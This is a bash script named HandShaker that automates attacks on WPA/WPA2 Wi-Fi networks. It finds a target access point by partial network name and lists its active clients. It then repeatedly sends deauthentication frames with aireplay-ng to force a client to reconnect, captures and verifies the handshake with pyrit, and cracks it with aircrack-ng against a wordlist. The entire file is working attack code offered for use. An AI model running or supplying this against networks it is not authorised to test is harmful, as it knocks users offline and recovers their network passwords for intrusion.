#!/bin/bash

## HandShaker Copyright 2013, d4rkcat (d4rkc4t@tormail.org)
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.


fapscan()																#Determine AP BSSID and channel
{
	clear
	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 -a -w $HOME/tmp -o csv&
	$COLOR 2;echo "[*] Scanning for AP's with names like $PARTIALESSID [*]";$COLOR 9
	while [ $DONE -z ] 2> /dev/null
		do
			sleep 0.3
			DONE=$(cat $HOME/tmp-01.csv 2> /dev/null | grep $PARTIALESSID) 
		done
	sleep 0.5
	killall airodump-ng
	CHAN=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 4 | head -1)
	cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 1 | head -1 > $HOME/tmp4.csv
	ESSID=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 14 | head -1)
	BSSID=$(cat $HOME/tmp4.csv)
	fclientscan
	sleep $SLP
	fapscan
}

fclientscan()															#Find active clients
{
	if [ ${BSSID:2:1} != ":" ] 2> /dev/null
		then
			rm -rf $HOME/tmp* 2> /dev/null
			fapscan
	fi
	rm -rf $HOME/tmp* 2> /dev/null
	CNT="0"
	clear
	if [ ${CHAN:1:1} = "," ] 2> /dev/null
		then
			CHAN=${CHAN:0:1}
	fi
	$COLOR 2;echo " [*] $ESSID Found! BSSID:$BSSID CHANNEL:$CHAN [*]"
	echo
	$COLOR 4;echo ' [*] Please wait while I gather active stations.. [*]';$COLOR 9
	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
	DONE=""
	while [ $DONE -z ] 2> /dev/null
		do
			sleep 0.3
			DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 10 | grep $BSSID)
		done
	DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 10)
	echo "$DONE" > $HOME/tmp
	while read LINE
		do
			if [ ${LINE:0:4} != "Stat" ] 2> /dev/null
				then
					echo ${LINE:0:17} >> $HOME/tmp1
			fi
		done < $HOME/tmp
	while read LINE
		do
			case ${LINE:2:1} in
			":")CNT=$(( CNT + 1 ));;
			esac
		done < $HOME/tmp1
	fcap
}

fcap()																	#Deauth, capture and strip handshakes
{
	CHKEX="0"
	if [ $CNT = 1 ] 2> /dev/null
		then
			CLIE=$(head -1 $HOME/tmp1)
		else
			$COLOR 2;echo " [*] $CNT active clients found:";$COLOR 9
			cat $HOME/tmp1
			echo
			$COLOR 4;echo " [>] Please paste client MAC or Press Enter to use the first one:";$COLOR 9 
			read -p "  >" CLIE
	fi
	if [ $CLIE -z ] 2> /dev/null
		then
			CLIE=$(head -1 $HOME/tmp1)
	fi
	FILENAME="${ESSID:1}"
	FILENAME2="${ESSID:1}"
	while [ ${CHAN:0:1} = " " ] 2> /dev/null
		do
			CHAN="${CHAN:1}"
	done
	clear
	echo
	DONE=""
	while [ $DONE -z ] 2> /dev/null
		do
			clear
			$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE";$COLOR 9;$COLOR2 9
			echo
			$COLOR 1;aireplay-ng -0 2 -a $BSSID -c $CLIE mon0;$COLOR 9
			echo
			$COLOR 4;echo " [*] Testing pcap for capture [*]";$COLOR 9
			sleep 5
			DONE=$(pyrit -r $HOME/tmp1-01.cap analyze | grep good)
			sleep 0.5
		done
		
	$COLOR 2;echo " [*] Capture was successful! "
	killall airodump-ng
	echo
	$COLOR 4;echo "[*] Saving and Stripping capture, please wait... [*]"
	echo
	DATER=$( date +%Y_%m_%d_%H%M%S )
	pyrit -r $HOME/tmp1-01.cap -o $HOME/Desktop/cap/handshakes/$FILENAME2-$DATER".cap" strip;$COLOR 9
	airmon-ng stop mon0&
	rm -rf $HOME/tmp*
	ISGOOD=$(pyrit -r $HOME/Desktop/cap/handshakes/$FILENAME2-$DATER".cap" analyze | grep good)
	
	if [ ${ISGOOD:0:5} = '#' ] 2> /dev/null
		then
			clear
			$COLOR 2;echo " [*] Handshake capture was successful!, Horray for you";$COLOR 9
			$COLOR 4;echo $ISGOOD;$COLOR 9
			echo
			$COLOR 2;echo " [*] Handshake saved to $HOME/Desktop/cap/handshakes/$FILENAME2-$DATER".cap"";$COLOR 9
			if [ $WORDLIST -z ] 2> /dev/null
				then
					$COLOR 4; echo " [>] Do you want to crack? [Y/n]";$COLOR 9
					read -p "  >" DOCRK
					case $DOCRK in
						"")fcrack;;
						"Y")fcrack;;
						"y")fcrack;;
						"n")fexit;;
						"N")fexit
					esac
				else
					fcrack
			fi
		else
			$COLOR 1;echo " [*] Sorry, handshake not captured";$COLOR 9
			echo
			pyrit -r $HOME/Desktop/cap/handshakes/$FILENAME2-$DATER".cap" analyze | grep "Not valid"
			rm -rf $HOME/Desktop/cap/handshakes/$FILENAME2-$DATER".cap"
			echo
	fi
	fexit
}

fcrack()																#Crack handshakes
{
	clear
	if [ $WORDLIST -z ] 2> /dev/null
		then
			$COLOR 4;echo " [>] Please enter the full path of a wordlist to use";$COLOR 9
			read -e -p "  >" WORDLIST
	fi
	if [ ! -f $WORDLIST ] 2> /dev/null
		then
			$COLOR 1;echo " [*] ERROR: $WORDLIST not found, try again..";$COLOR 9
			WORDLIST=""
			sleep 1
			fcrack
		else
			aircrack-ng -w $WORDLIST $HOME/Desktop/cap/handshakes/$FILENAME2-$DATER".cap"
	fi
	fexit
}

fexit()																	#Exit
{
	tput setab 9
	killall aircrack-ng 2> /dev/null
	rm -rf $HOME/tmp* 2> /dev/null
	MOND=$(ifconfig | grep mon0)
	if [ $MOND -z ] 2> /dev/null
		then
			exit
		else
			airmon-ng stop mon0
	fi
	exit
}

fhelp()																	#Help
{
	clear
	echo """ HandShaker - Detect, capture and crack WPA/2 handshakes by partial unique ESSID
	Usage: handshaker x y z
	
			x - Partial unique ESSID (required)
			y - Wireless Interface card
			z - path to wordlist to use for cracking
				
	eg. handshaker Hub3-F wlan0 /usr/share/wordlists/rockyou.txt"""
	exit
}



fstart()																#Startup
{
	COLOR="tput setab"
	COLOR2="tput setaf"
	CHKEX=1
	MOND=$(ifconfig | grep mon0)
	mkdir -p $HOME/Desktop/cap
	mkdir -p $HOME/Desktop/cap/handshakes

	if [ $MOND -z ] 2> /dev/null
		then
			clear
			$COLOR 4;echo " [>] Which interface do you want to use?:";$COLOR 9
			echo
			iwconfig | grep "wlan"
			echo
			read -p "  >" NIC
			clear
			airmon-ng start $NIC
			clear
		else
			NIC="mon0"
			clear
	fi
	fapscan
}

trap fexit 2

PARTIALESSID="$1"
if [ $3 -z ] 2> /dev/null
	then
		WORDLIST=""
	else
		WORDLIST=$3
fi
if [ ! -z $2 ] 2> /dev/null
	then
		MOND=$(ifconfig | grep mon0)
		if [ $MOND -z ] 2> /dev/null
			then
				airmon-ng start $2
		fi
fi
if [ $# -lt 1 ]
	then
		fhelp
elif [ $1 = "--help" ]
	then
		fhelp
elif [ $1 = "-h" ]
	then
		fhelp
fi

fstart
